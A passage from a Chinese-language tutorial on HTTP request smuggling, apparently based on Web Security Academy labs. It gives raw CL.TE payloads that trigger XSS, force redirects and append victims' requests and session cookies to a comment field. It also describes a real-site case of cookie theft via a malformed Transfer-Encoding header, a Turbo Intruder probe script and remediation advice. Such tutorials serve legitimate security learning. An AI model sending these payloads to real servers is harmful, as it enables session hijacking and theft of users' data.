    0
    GET /post?postId=3 HTTP/1.1
    User-Agent: “>
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 5
    x=1
会在该网站的任意页面触发xss，因为在http序列中，走私的请求会插到用户对网站的请求前面
###  4.2 direct+smuggling
该场景基于url跳转,把用户重定向到一个固定网页，lab为我们提供个跳转api,/post/next?postId=3路由跳转到的是/post?postId=4。
此时我们可以利用走私攻击并配合重定向进行钓鱼。
发送以下数据包一次：
    POST / HTTP/1.1
    Host: ac501fd21fceba4f80de460400140045.web-security-academy.net
    Connection: close
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
    Sec-Fetch-Dest: document
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
    Sec-Fetch-Site: none
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: session=Rmtn44vZ2BeGqD1ToPbAYrcDS0UiIKwQ
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 178
    Transfer-Encoding: chunked
    0
    GET /post/next?postId=3 HTTP/1.1
    Host: ac501fd21fceba4f80de460400140045.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 10
    x=1
然后访问原网站任意页面，都会被重定向到/post?postId=4
###  4.3窃取用户请求
利用走私攻击捕捉用户请求数据包，窃取cookie
我们在发送评论处的api接口构造请求包如下
发送以下数据包
    POST / HTTP/1.1
    Host: ac671f031fa2e9ba80ffdc2d00690027.web-security-academy.net
    Connection: close
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Cookie: session=7fnaaemuD32ZqUPyB6EGVA8vOL8wwz8p
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 343
    Transfer-Encoding: chunked
    0
    POST /post/comment HTTP/1.1
    Host: ac671f031fa2e9ba80ffdc2d00690027.web-security-academy.net
    Content-Length: 600
    Content-Type: application/x-www-form-urlencoded
    Cookie: session=7fnaaemuD32ZqUPyB6EGVA8vOL8wwz8p
    csrf=aeITUnejzQ7XRUTUiEWl4X6ckwPt8TWc&postId=2&name=1&email=123%40qq.com&website=https%3A%2F%2F
成功把用户的请求拼接到走私请求的comment参数上，如下图
## 5.案例
该案例利用的是CL-TE的攻击方式。根据RFC，当Content-Length和Transfer-Encoding两个标头同时出现在同一请求包时，Transfer-Encoding始终被优先处理。但是，如果Transfer-Encoding标头格式错误，则前端服务器和后端服务器之间的对请求的解释可能会有所不同。在该站点上发现的CLTE问题是，在请求包中Transfer-Encoding 和:之间加多一个空格，使该字段的格式为非标准值，此时前端服务器依据RPC规范，优先处理Content-Length，而后端服务器并没严格遵守RPC规范，以Transfer-Encoding为依据进行处理数据包。
恶意请求的说明：
可见用户的正常请求被拼接到X字段，而X请求头非标准请求头，故忽略，而该用户的cookie字段也被拼接到了该走私的请求上
在Burp Collaborator Client上能成功窃取到用户的cookie
## 6.测试工具
在burpsuite上查找到请求包，右键lauch smuggle probe，随后在burpsuite的扫描结果上显示报告
进一步确定漏洞
右键点击”smuggle attack(CL.TE)”
出现Turbo Intruder脚本
    # if you edit this file, ensure you keep the line endings as CRLF or you’ll have a bad time
    def queueRequests(target, wordlists):
    # to use Burp’s HTTP stack for upstream proxy rules etc, use engine=Engine.BURP
    engine = RequestEngine(endpoint=target.endpoint,
    concurrentConnections=5,
    requestsPerConnection=1,
    resumeSSL=False,
    timeout=10,
    pipeline=False,
    maxRetriesPerRequest=0,
    engine=Engine.THREADED,
    # This will prefix the victim’s request. Edit it to achieve the desired effect.
    prefix = ”’GET /hopefully404 HTTP/1.1
    X-Ignore: X”’ //走私一个uri为/hopefully404的请求包，下一个用户的请求会拼接到X-Ignore字段后面，因此要是存在走私漏洞，则会返回一个状态码为404的数据包
    # The request engine will auto-fix the content-length for us
    attack = target.req + prefix
    engine.queue(attack)
    victim = target.req
    for i in range(14):
    engine.queue(victim)
    time.sleep(0.05)
    def handleResponse(req, interesting):
    table.add(req)
点击“attack”进行爆破测试
看到存在404状态码的数据包，说明存在http走私漏洞
**修复方案** ：
1、前端服务器对前段输入规范化  
2、前端服务器使用HTTP2.0  
3、后端服务器丢弃非正常请求